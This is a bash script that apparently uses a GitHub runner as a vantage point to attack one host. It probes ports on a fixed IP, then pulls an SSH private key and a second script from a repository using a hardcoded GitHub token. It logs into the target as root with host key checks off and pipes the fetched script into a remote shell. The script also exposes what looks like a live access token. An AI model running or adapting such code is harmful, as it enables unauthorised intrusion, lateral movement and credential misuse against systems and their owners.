#!/bin/bash
# i8480 r1: g0023 route/adjacency recon via GitHub-runner-host -> ssh root
P=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
R=https://raw.githubusercontent.com/dongsuju/ul-plant/main
W=/tmp/ul8480; mkdir -p $W
TAG=r1
echo "=== UL8480 start $(date -u +%FT%TZ) host=$(hostname) uid=$(id -u) ip=$(curl -s -m 8 https://api.ipify.org 2>/dev/null)"
# runner-side reachability to g0023 (from this host's egress)
for p in 22 781 8099 9099 8000 11434 9100 18080; do
  timeout 4 bash -c "exec 3<>/dev/tcp/123.184.7.135/$p" 2>/dev/null && echo "RUNNER_OPEN 123.184.7.135:$p" || echo "RUNNER_CLOSED 123.184.7.135:$p"
done
curl -fsSL -m 40 -H "Authorization: token $P" -H "Accept: application/vnd.github.raw" "$R/keys2/ul5817_key" -o $W/k || { echo "KEY_FETCH_FAIL"; exit 1; }
chmod 600 $W/k; ssh-keygen -y -f $W/k > $W/k.pub 2>/dev/null; echo "KEY_PUB $(cut -c1-50 $W/k.pub)"
curl -fsSL -m 40 -H "Authorization: token $P" -H "Accept: application/vnd.github.raw" "$R/vantage/gv8480/r1.sh" -o $W/r1.sh || { echo "SCRIPT_FETCH_FAIL"; exit 1; }
OK=0
for t in 1 2 3; do
  if timeout 30 ssh -i $W/k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o IdentitiesOnly=yes -o ServerAliveInterval=15 root@123.184.7.135 'id -u' 2>$W/e.txt; then echo "PRECHECK_OK try=$t"; OK=1; break; fi
  echo "PRECHECK_FAIL try=$t :: $(tail -1 $W/e.txt)"
  sleep 6
done
if [ "$OK" = 1 ]; then
  timeout 700 ssh -i $W/k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o IdentitiesOnly=yes -o ServerAliveInterval=15 root@123.184.7.135 "TAG=$TAG bash -s" < $W/r1.sh 2>&1
else
  echo "--- ssh verbose tail"
  timeout 30 ssh -i $W/k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o IdentitiesOnly=yes -v root@123.184.7.135 'id' 2>&1 | tail -25
fi
echo "=== UL8480 end $(date -u +%FT%TZ)"
